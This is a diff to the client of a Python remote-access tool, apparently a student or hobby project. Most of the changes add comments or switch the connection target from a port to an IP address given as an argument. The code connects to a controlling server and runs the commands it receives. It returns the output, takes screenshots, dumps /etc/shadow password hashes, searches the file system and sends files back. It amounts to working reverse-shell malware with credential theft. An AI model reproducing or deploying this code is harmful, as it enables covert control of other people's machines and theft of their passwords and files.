@@ -5,28 +5,32 @@ import os
 from subprocess import check_output, DEVNULL, PIPE, run, Popen
 from secure_socket import Client, HOSTNAME
 import pyscreenshot
+import ipaddress
 
 class Computer:
   def shell(self, socket):
-    origin=os.getcwd()
-    socket.send(self.get_prompt())
+    origin=os.getcwd() # save original path for later
+    socket.send(self.get_prompt()) # send prompt to server
     cmd=socket.receive()
     while cmd != 'exit':
       out=''
       try:
-        if cmd=="cd":
+        if cmd=="cd": # if cd alone, go to home
           os.chdir(self.get_env()[1])
-        elif cmd.startswith("cd ") and len(cmd[3:].strip())>0:
-          os.chdir(cmd[3:].strip())
-        else:
+        elif cmd.startswith("cd ") and len(cmd[3:].strip())>0: # if cd with path
+          os.chdir(cmd[3:].strip()) # go to path
+        else: # else run command
           output = run(cmd.split(' '), check=False, stdout=PIPE, stderr=PIPE, timeout=5)
           out=output.stdout.decode("utf-8")
           err=output.stderr.decode("utf-8")
-          out=f"{out}{err}"
+          out=f"{out}{err}" # concat stdout and stderr
       except Exception as e:
         out=str(e)
+      # send output to server, even if it's an error
+      # * is separator between prompt and output
       socket.send("*".join([self.get_prompt(), out]))
       cmd=socket.receive()
+    # go back to original path
     os.chdir(origin)
 
   def screenshot(self,filename):
@@ -40,7 +44,7 @@ class Linux(Computer):
     return check_output(["ip", "a"]).decode('utf-8')
 
   def hashdump(self):
-    if os.access('/etc/shadow', os.R_OK):
+    if os.access('/etc/shadow', os.R_OK): # check for reading rights
       return check_output(["cat", "/etc/shadow"]).decode('utf-8')
     else:
       socket.send("You don't have permission for it.")
@@ -55,14 +59,14 @@ class Linux(Computer):
     else:
       home=f'/home/{user}'
       end="$"
-    return [user, home, path, end]
+    return [user, home, path, end] # return environment info
   
   def get_prompt(self):
     user, home, path, end = self.get_env()
     if path.startswith(home):
       path=home.join(path.split(home)[1:])
-      path=f"~{path}"
-    return f"[{user}@{HOSTNAME}:{path}] {end} "
+      path=f"~{path}" # append tilde if in home directory
+    return f"[{user}@{HOSTNAME}:{path}] {end} " # concat envrironment info into prompt
   
   def search(self, filename, path):
       return run(['find', path, '-name', filename], stderr=DEVNULL, stdout=PIPE).stdout.decode("utf-8").strip()
@@ -76,10 +80,10 @@ class Windows(Computer):
     path=os.getcwd()
     home='C:\\'
     end=">"
-    return [user, home, path, end]
+    return [user, home, path, end] # same as linux
   
   def get_prompt(self):
-    user, home, path, end = self.get_env()
+    _, _, path, end = self.get_env()
     return f"{path}{end} "
   
   def hashdump(self):
@@ -87,6 +91,7 @@ class Windows(Computer):
   
 
   def search(self,filename, path):
+    # https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/dir
     command = 'dir /s /b ' + path + filename
     result =  run(command, stdout=PIPE, stderr=DEVNULL, shell=True)
     if result.returncode == 0:
@@ -94,6 +99,7 @@ class Windows(Computer):
         return output
 
 def download(socket):
+  # knowing * char is not allowed in filenames, it can be used as separator.
   filename_src, filename_dst=socket.receive().split('*')
   if os.path.isfile(filename_src):
     socket.send('ok')
@@ -102,12 +108,14 @@ def download(socket):
     socket.send('File not found.')
 
 if __name__ == "__main__":
+  host="127.0.0.1"
   try:
-    port=int(argv[1])
-    if port<1025 or port>65535:
-      port=62832
+    # verify ip is valid
+    ipaddress.ip_address(argv[1])
+    host=argv[1]
   except:
-    port=62832
+    print("The IP adress is not valid.")
+    exit(1)
   
   system=None
   match find_system():
@@ -119,10 +127,11 @@ if __name__ == "__main__":
       exit('OS not supported.')
   
   try:
-    socket=Client(port=port)
+    socket=Client(host=host)
   except:
     exit("Server unreachable.")
   
+  # list existing commands that can be used on the server
   using=True
   while using:
     match socket.receive():
